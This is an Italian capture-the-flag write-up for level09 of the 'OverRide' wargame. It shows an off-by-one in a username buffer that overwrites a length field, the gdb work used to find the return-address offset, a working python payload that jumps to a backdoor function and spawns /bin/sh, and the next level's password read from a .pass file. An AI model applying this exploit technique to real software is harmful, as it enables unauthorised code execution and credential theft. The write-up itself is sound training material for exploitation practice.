# Level 09
Analizziamo le stringhe presenti nel binario:
```
level09@OverRide:~$ readelf -p '.rodata' level09

String dump of section '.rodata':
  [     8]  >: Msg sent!
  [    15]  >: Msg @Unix-Dude
  [    27]  >>:
  [    2c]  >: Enter your username
  [    43]  >: Welcome, %s
  [    58]  --------------------------------------------^J|   ~Welcome to l33t-m$n ~    v1337        |^J-------------------------------------------
```
e passiamo ad analizzare con `gdb`:
```
level09@OverRide:~$ gdb -q level09
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x00000000000006f0  _init
0x0000000000000720  strncpy
0x0000000000000720  strncpy@plt
0x0000000000000730  puts
0x0000000000000730  puts@plt
0x0000000000000740  system
0x0000000000000740  system@plt
0x0000000000000750  printf
0x0000000000000750  printf@plt
0x0000000000000760  __libc_start_main
0x0000000000000760  __libc_start_main@plt
0x0000000000000770  fgets
0x0000000000000770  fgets@plt
0x0000000000000780  __cxa_finalize
0x0000000000000780  __cxa_finalize@plt
0x0000000000000790  _start
0x00000000000007bc  call_gmon_start
0x00000000000007e0  __do_global_dtors_aux
0x0000000000000860  frame_dummy
0x000000000000088c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
0x0000000000000ad0  __libc_csu_init
0x0000000000000b60  __libc_csu_fini
0x0000000000000b70  __do_global_ctors_aux
0x0000000000000ba8  _fini
```

### Funzione `main`
Chiama la funzione `handle_msg`.

### Funzione `handle_msg`
Inizializza una struttura formata nel seguente modo:
```
typedef struct s_info
{
    char msg[140];
    char username[40];
    int size;
}               t_info;
```
e assegna alla `size` `140` per poi chiamare le funzioni `set_username`
e `set_msg`.

### Funzione `set_username`
Viene letto tramite `fgets` dallo standard input un buffer da 128 byte e salva
41 caratteri nella variabile `username` della struttura.

### Funzione `set_msg`
Viene letto tramite `fgets` dallo standard input un buffer da 1024 byte e copia
tramite `strncpy` nella variabile `msg` della struttura un numero di caratteri
specificato dalla variabile `size` della struttura.

### Funzione `secret_backdoor`
Avvia la funzione `system` passando come argomento ciò che viene letto dallo
standard input tramite `fgets`.

### Soluzione
La variabile nella struttura `username` è grande 40 byte mentre nella funzione
`set_username` possiamo copiare `41` byte, di conseguenza abbiamo la possibilità
di sovrascrivere la variabile `size` e copiare più di 140 byte nella variabile `msg`,
quindi seguendo questa logica troviamo l'offset per sovrascrivere l'indirizzo di ritorno
in `eip`:
```
level09@OverRide:~$ python -c "print 'A'*40 + '\xff' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A'" > /tmp/exploit
level09@OverRide:~$ gdb -q level09
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
(gdb) r < /tmp/exploit
Starting program: /home/users/level09/level09 < /tmp/exploit
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5c8:
 rip = 0x555555554931 in handle_msg; saved rip 0x4138674137674136
 called by frame at 0x7fffffffe5d8
 Arglist at 0x6741356741346741, args:
 Locals at 0x6741356741346741, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rip at 0x7fffffffe5c8
```
Abbiamo individuato l'offset a 200 caratteri, quindi ora troviamo l'indirizzo della
funzione `secret_backdoor`:
```
(gdb) x secret_backdoor
0x55555555488c <secret_backdoor>:       0xe5894855
```
Quindi scriviamo l'exploit ed eseguiamo:
```
level09@OverRide:~$ (python -c "print 'A'*40 + '\xff' + '\n' + 'B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
exit
```
```
level09@OverRide:~$ su end
Password: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
end@OverRide:~$ ls
end
end@OverRide:~$ cat end
GG !
```